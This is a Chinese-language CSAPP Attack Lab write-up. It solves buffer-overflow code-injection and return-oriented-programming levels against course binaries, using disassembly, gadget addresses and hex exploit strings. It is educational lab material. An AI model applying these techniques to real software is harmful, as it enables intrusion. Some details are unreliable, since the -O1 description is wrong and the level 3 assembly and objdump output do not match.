# Attack Lab preview

# 1 requirements

## 1.1 cite

- CSAPP 3.10~3.12 「3rd edition」
- Attack lab [writeup](http://csapp.cs.cmu.edu/3e/attacklab.pdf)

## 1.2 relative knowledge

c语言**对于数组的引用**不进行任何的**边界检查**，并且局部变量和状态信息「如保存的寄存器值和返回地址」都会存放在栈中，如果对越界的数组进行写操作时，会破坏栈中的状态信息，常见的即为`缓冲区溢出`。这个时候可以表述为是字符串的长度超出了为数组分配的空间

书本中「p177-179」提过的「echo」即为示例。

> 此时的缓冲区只有8个字节，任何长度超过7个字符的字符串都将越界

对于编写的代码进行优化的方法是：

```bash
linux> gcc -fno-asynchonous-unwind-tables -fno-stack-protector -O1 -S echo.c
```

- `-fno-asynchonous-unwind-tables`: 用来不生成[CFI](https://en.wikipedia.org/wiki/Control-flow_integrity)「control flow intergrity」指令
- `-fno-stack-protector`: 组织进行栈破坏检测，默认允许使用栈保护者
- `-O1`: 不做任何优化处理
- `-S`: 生成汇编代码后即结束

**优化后，** 程序会在栈上为字符数组分配更多的字节防止缓冲区溢出，但是如果输入的字节超出了安全字节数，会将echo的返回地址给破坏，这个即是`缓冲区溢出漏洞`。

在attack lab中，我们需要利用栈检测机制来解决5个phases

# 2 solutions -- ctarget

## 2.1 table of contents

- `cookie.txt`: 8位的16位进制数，作为攻击的标志符
- `fram.c`： rop攻击中作为gadgets的产生源
- `ctarget:` code-injection 文件
- `rtarget`: rop攻击的target文件
- `hex2row:` 将16进制数转化为攻击字符，因为有些字符在屏幕上无法显示，由字符的16进制数，自动转化为该字符

## 2.2 level 1

> non-injection，需要做的是劫持程序流，将函数的正常返回地址重写，使函数重定向于指定的函数。在这里，需要重定向到`touch1`函数

因为担心的是在调用getbuf时返回的地址会出现错误，一般地址会存储在栈帧的下8个字节，因此需要在原先正常的返回地址上填充touch1函数的地址。

`ctarget`流程: $test()\rightarrow touch1()$

1. 在`test()`中调用了`getbuf()`，输入字符串后，正常退出时，会执行`exit(0)`的方法。

```gdb
gdb ctarget;
```

2. 之后，我们调用

```bash
disas getbuf
```

得到：

```bash
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq  
```

> 从这里我们可以得到在getbuf中分配了0x28=40个字节的空间

3. 查看`touch1()`的地址

```bash
disas touch1
```

```bash
   0x00000000004017c0 <+0>:	sub    $0x8,%rsp
   0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    $0x1,%edi
   0x00000000004017dd <+29>:	callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:	mov    $0x0,%edi
   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
```

> 得到touch1()的地址是`0x4017c0`

得到以上需要的信息后，构建输入字符，来填充栈。因为我们的目的值返回`touch1()`，因此输入任意字符串均可，但是在最后需要填充`touch1()`的地址

目前大部分电脑采用的都为`little-endian`「小端序」的机器，低位在低位，高位于高位，因此我们这里需要逆着输入文本，即后8位的地址为`c0 17 40 00` 

> 在[`endian`排序](https://blog.csdn.net/xiangguiwang/article/details/70036637)中，看的是有效位的级别进行排序，不是<font color=red>**数值大小**</font>。
>
> 如在原先的地址中最高有效位为00，c0则为最低有效位，小端序中反过来有：
>
> 此时的最高位为c0，最低位为00，其他位置跟着逆序，而不是按照大小来排

因此在这里我们需要输入的文本除了input的40个字节外，加上之后的8位字节即为

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

> 这中间mac的文本编辑一开始保存的文件位`.rtf`格式，但是`hex2raw`提供转换的仅有`.txt`格式，而直接修改`.rtf`格式会有乱码。
>
> mac中在文本编辑处选择`ctrl+shift+t`即为纯文本模式，之后自动保存的也为`txt`文件

最后需要通过`hex2raw`来转换字节码序列,将该二进制txt文件保存在`level1.txt`文件中后，过关：

```bash
./hex2raw -i solutions/level1.txt | ./ctarget -q
```

## 2.3 level 2

1. 先看一下touch2做了啥

```c
void touch2(unsigned val)
{
	vlevel = 2; /* Part of validation protocol */
	if (val == cookie) {
  printf("Touch2!: You called touch2(0x%.8x)\n", val);
  validate(2);
}else {
  printf("Misfire: You called touch2(0x%.8x)\n", val);
  fail(2);
}
	exit(0);
}
```

> touch2验证的是cookie中的值与传入的val是否相等

而cookie与getbuf有关，所以题目需要我们插入一小段代码来拦截程序流，得到正确的输入

**解题思路为：**

- 将正常的返回地址设置为插入代码的地址，而插入的位置需要直接在栈顶插入，即返回地址需要设置为`%rsp`的地址
- 将`cookie`的值移入到`%rdi`中，`%rdi`即为函数调用的第一个参数
- 返回`touch2`的起始地址

- 需要调用touch2，但是不能直接使用call，jmp这些指令，因此只能使用ret改变当前指令寄存器的指向地址，而ret是从栈上弹出的返回地址，所以在调用之前需要先将touch2的地址压栈

由cookies`0x59b997fa`得到需要传进第一个参数寄存器的地址，又因为我们需要把touch2的地址返回到栈顶，因此得到寄存器的操作为：

```bash
mov  $0x59b997fa, %rdi 
push $0x4017ec
retq
```

> 这里的`0x4017ec`即touch2的地址
>
> (gdb)disas touch2     ---------> to get the addr

现在我们需要把这个汇编代码转为字节码：

2. 汇编 --- > 字节序列

> 上述汇编保存为了`level2.s`

```bash
gcc -c level2.s
objdump -d level2.o
```

得到：

```bash
0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq  
```

上述则为我们需要往getbuf中插入的字节序列，注意在最后要加入返回的地址

3. 求`%rsp`地址

`%rsp`作为栈帧的首地址，需要从上一个调用的`getbuf()`中获得，这里需要对`getbuf`设置断点才行，因为`getbuf`后还会执行其余的流程

- 设置断点

```bash
break getbuf % 设置第一个断点
run -q			 % 运行
disas        % 看看这个断点的反汇编
stepi				 % 到下一个断点，此时返回的%rsp即为
print /x $rsp% 打印$rsp的地址
```

得到`%rsp`的地址为：`0x5561dc78`，记住小端序

4. 最后结果

```bash
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

## 2.4 level 3

> phase 3 与phase 2 一样，需要插入代码，但是需要将字符串作为变量传入
>
> 要求：针对ctarget函数，修改函数test来调用getbuf的返回地址，使getbuf返回touch3函数而不是test

1. 先来看看touch3 做了什么

> touch3 中需要hexmatch的协助

- **hexmatch**

```c++
int hexmatch(unsigned val, char *sval){
  char cbuf[110];
  /*  Make position of check string unpredictable */
  char *s = cbuf + random()%100; 
  sprintf(s, "%.8x", val);
  return strncmp(sval, s, 9) == 0;
}
```

- **touch3**

```c++
void touch3(char *sval)
{
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
	printf("Touch3!: You called touch3(\"%s\")\n", sval);
	validate(3);
	}else {
	printf("Misfire: You called touch3(\"%s\")\n", sval);
	fail(3);
	}
	exit(0);
}
```

`touch3`函数中调用了`hexmatch`函数，`hexmatch`函数的功能为匹配`cookie`和传进去的字符是否匹配，在这里`cookie`的值为`0x59b997fa`，所以在这里传进去的参数应该是`0x59b997fa`

**tips：**

- 字符串以`\0`结尾，所以字符串序列的结尾是字节0
- `man ascii`可以用来查看每个字符的16进制表示
- 当调用`hexmatch`和`strncmp`时，会将数据压入到栈中，可能会覆盖`getbuf`栈帧的数据，因此传入字符串的位置需要十分谨慎，原因：

对于传进去的字符串的位置，如果放在`getbuf`栈中，有：

```c
char *s = cbuf + random()%100;
```

这里可以看到`s`的位置是随机的，之前留在`getbuf`中的数据，有可能被`hexmatch`重写，因此放在`getbuf`中并不安全，需要回到调用`getbuf`的位置，即`test`栈帧中

通过分析，`touch3`的解题思路为：

- 将`cookie`字符串转化为16进制
- 将字符串的地址传送到`%rdi`中
- 和`touch2`一样，调用`touch3`函数时，先将`touch3`函数压栈，再调用`ret`指令

根据题意，因为我们需要把`test`中`getbuf`的返回地址调到`touch3`，需要知道的信息为：

- `cookie`的地址转移
- 字符串的起始位置和将返回地址改为touch3存储字符串的地址

2. **求需要的字节序列**

- `test`中的`getbuf`

通过移动空间的指令，得到需要移动cookie的注入的汇编`level2.s`为：

```bash
mov  $0x5561dc78,%rdi
pushq $0x4017a8
ret

```

编译：

```bash
gcc -c level2.s
objdump -d level2.o
```

得到：

```bash
0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```

- `插入%rsp返回地址`

得到：

```bash
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 78 
dc 61 55 00 00 00 00 35 
39 62 39 39 37 66 61 00
```

最后的插入的为`cookie`ascii码:

> 可以通过 `man ascii`来查看ascii码

为：`35 39 62 39 39 37 66 61 00`

- 最后pass：

```bash
[root@c95bfe601b83 target1]# ./hex2raw -i solutions/level3.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 
```

# 3 Solutions -- rtarget

## 3.1 relative knowledge

### 3.1.1 [ROP](https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B)

> Rop: return-oriented-programming (面向返回编程)

`rop`为漏洞利用技术，允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名，攻击者控制**堆栈调用**来**劫持程序控制流**并执行针对性的机器语言指令序列「成为`gadgets`」。

每一段`gadget`通常结束于`retrun`指令，并位于共享库代码中的子代码。系统通过调用这些代码，使攻击者能够在拥有更简单攻击防范的程序内执行任意操作

### 3.1.2 background

- **堆栈溢出攻击**

rop的攻击通常针对的为**缓冲区溢出**，在缓冲区溢出中，如果数据存入内存前没有检查**接受在一定范围内**的函数会收到**多余**正常承受范围的数据时，此时数据如果写入栈，多余的数据会溢出，覆盖替换返回地址。在原本用来重定向控制流并返回给调用者的地址被覆盖替换后，控制流将被改写到新分配的地址。

**攻击形式：** 通过针对堆栈部分的代码（有效载荷），2004年以后，Microsoft提供了缓冲区溢出保护，操作系统最终使用数据执行保护技术来修补缓冲区溢出的漏洞。

### 3.1.3 protected ways

> 因为缓冲区溢出攻击的普遍发生会给计算机系统造成许多麻烦，因此现代的编译器和os实现了许多机制，来避免这类攻击，限制入侵者通过缓冲区溢出攻击来获得系统控制的方式。

- **栈随机化**

**特点：** 使栈的位置在程序每次运行时都有变化，因此机器即使运行同样的代码，它们的栈地址是不同的，而上述的三个`touch`中，栈的地址是固定的，因此可以获取到栈的地址，并跳转到栈的指定位置

- **栈保护检测**

在gcc产生的代码中加入了`栈保护者`机制，来检测缓冲区越界，主要方式是在栈帧中任何局部缓冲区和栈状态之间存储特殊的金丝雀「canary」值，在恢复寄存器状态和在函数返回之前，程序会检查该金丝雀「canary」值是否被函数的某个操作或者因为函数调用而发生了改变，如果改变的话，程序会异常中止。

- **限制可执行代码区域**

> 主要方式为限制哪些内存区域能够存放可执行的代码

可以知道，在rop攻击中，由于栈上限制了不能够插入可执行的代码，因此不能像`touch2`，`touch3`中插入代码，需要在已经存在的程序中找到特定的指令序列，并且这些指令必须是以`ret`结尾。这一段的指令序列，我们称为`gadget`.

每一段`gadget`包含着一系列的指令字节，并且以`ret`结尾，跳转到下一个`gadget`，通过连续执行一系列的指令代码，来对程序造成攻击

**需要用的表：**

1. **movq指令编码**

![image-20210222100009518](/Users/zoriswang/Library/Application Support/typora-user-images/image-20210222100009518.png)

2. **popq指令编码**

![image-20210222100043726](/Users/zoriswang/Library/Application Support/typora-user-images/image-20210222100043726.png)

3. **movl指令编码**

![image-20210222100112489](/Users/zoriswang/Library/Application Support/typora-user-images/image-20210222100112489.png)

4. **字节编码**

![image-20210222100132322](/Users/zoriswang/Library/Application Support/typora-user-images/image-20210222100132322.png)

## 3.2 level 4

> touch2中，需要做的与上一个phase 2相同,同为劫持程序流。但是使用的gadget由提及的types组成，并且只允许使用前八个寄存器`%rax~%rdi`

对于`rtarget`，修改函数`test`调用`getbuf`的返回地址，使`getbuf`返回`touch2`而非`test`

**具体思路：** 从test中弹出getbuf的地址于`%rax`中，后将`cookie`的地址保存到`%rax`中「因为在touch2中对比的是cookie的值」，为了保证传入的数据在touch2中是正确的，我们还需要用多的寄存器来保存`%rax`值，因此最后形成的栈帧结构从顶到底为:
$$
(popq\ \%rax) \rightarrow cookie \rightarrow (movl\ \%rax, \%rdi) \ \rightarrow touch2
$$
**SOME ADVICE:**

- 任何关于`rtarget`需要的`gadgets`，都能在`start_farm`和`mid_farm`中找到
- 这个`attack`可以仅用两个`gadgets`来完成
- 注意，当`gadget`使用`popq`指令时，会有数据从栈中弹出，此时的**exploit code**需要包含`gadget address`和`data`

> gdb输出完整的`as`

```bash
way 1: (gdb) set pagination off
way 2: (gdb) set height umlimited
```

**Analysis:** 因为目的是将`getbuf`的返回地址返回到`touch2`中，因此使用`popq`从栈中去数据，然后将数据保存到对应的寄存器中`%rdi`就可以了

**关键：** 找到`%rax`在哪里

1. **找`%rax`**

由`popq`指令代码，知道`%rax`的指令代码为`58`，下一步需要找到`%rax`所在的位置：「在这里我是用gcc来反汇编farm.s，来查找指令代码所在的工具函数的位置」

```bash
gcc -c farm.s
objdump -d farm.o
```

发现在工具函数`<addval_219>`中出现了：

```bash
0000000000000013 <addval_219>:
  13:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  19:	c3                   	retq 
```

可以知道`<addval_219>`为`popq`所在的位置

2. 找`movq %rax, %rdi`的位置

需要找的指令序列为：`48 89 c7`

> 这个在我的反汇编中就显示在`<addval_219>`上方hhh
>
> 会注意到下方也有，但是因为在这里是赋值，所以需要找关于`lea`的指令

```bash
000000000000000c <addval_273>:
   c:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  12:	c3                   	retq 
```

现在通过gdb找到他们的地址吧～

3. **找地址**

- `<addval_219>`

```bash
disas addval_219
```

得到：

```bash
Dump of assembler code for function addval_219:
   0x00000000004019a7 <+0>:	lea    -0x6fa78caf(%rdi),%eax
   0x00000000004019ad <+6>:	retq
```

因此`popq「58」`的地址为：`0x4019a7+0x4 = 0x4019ab`

- `<addval_273>`

```bash
disas addval_273
```

得到：

```bash
Dump of assembler code for function addval_273:
   0x00000000004019a0 <+0>:	lea    -0x3c3876b8(%rdi),%eax
   0x00000000004019a6 <+6>:	retq   
End of assembler dump.
```

`movq %rax,%rdi`地址为：`0x4019a0+0x2 = 0x4019a2`

又`touch2`的地址为：`0x4017ec`

而`cookie`的指令表示为：`0x59b997fa`

3. **final result**

根据栈帧顺序得到：

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00

```

## 3.3 level 5

在level 5中，我们需要把字符串的起始地址，传到`%rdi`中，之后再调用`touch3`函数。

因为`touch3`中用于判别的函数为`hexmatch`，而`hexmatch`会将字符串随机的分配到栈中，因此不能直接用地址来索引字符串的起始位置，只能通过`栈顶地址+偏移量`来索引字符串的起始地址，在`farm`中能够得到这样的`gadget`, 通过引用`lea(%rdi,%rsi,1),%rax`将字符串的首地址传给`%rax`.

**思路为：**

1. 得到栈帧的`%rsp`的地址，发送给`%rdi`
2. 获得字符串的偏移量，发送给`%rsi`
3. 通过`lea(%rdi,%rsi,1),%rax`将字符串的首地址传给`%rax`，再由`%rdi`保存

1. **找到`%rsp`地址**

由`%rsp`传到`%rax`有，`movq %rsp,%rax`:`48 89 e0`

这一步在`addval_190`中，地址为：`0x401a06`

2. **将`%rax`的内容发送至`%rdi`**

由`%rax`传到`%rdi`有，`movq %rax, %rdi`: `48 89 c7`

于addval_273中，地址为：`0x4019a2`

3. **字符串的偏移量发送至`%rsi`**

> 90 表示nop，空字符

- **先将字符弹出至`%rax`**

这里需要找的为`popq %rax` : `58`

于getval_280中，地址为：`0x4019cc`

- **`%eax`内容发送至`%edx`**

有`movq %eax,%edx`: `89 c2`

于getval_481中，地址为:`0x4019dd`

- **`%edx`内容发送至`%ecx`**

有`movq %edx,%ecx`: `89 d1`

于setval_167中，地址为：`0x401a70`

- **`%ecx`内容发送至`esi`**

有`movq %ecx,%esi`: `89 cf`

于addval_436中，地址为：`0x401a13`

4. **栈顶+偏移量**得到字符串首地址发送至`%rax`

找到`lea (%rdi,%rsi,1),%rax`的地址

过程为`add_xy`中，gadget地址为：`0x4019d6`

5. **`%rax`内容发送至`%rdi`**

有:`48 89 c7`

于addval_273中，此时gadget的地址为：`0x4019a2`

6. **最后的分析**

从字符串首地址`popq %rax`到返回地址之间一共有`9`条指令，因此偏移量为`0x48`，在栈帧间要分配足够的空间来放指令：

栈帧自顶向下为：

```bash
movq %rsp,%rax
movq %rax,%rdi
popq %rax
0x48
movl %eax, %edx
movl %edx, %ecx
movl %ecx, %esi
lea(%rdi,%rsi,1),%rax
movq %rax, %rdi
touch3
35 39 62 39 39 37 66 61 00
0x0
```

> touch3的地址：`0x4018fa`

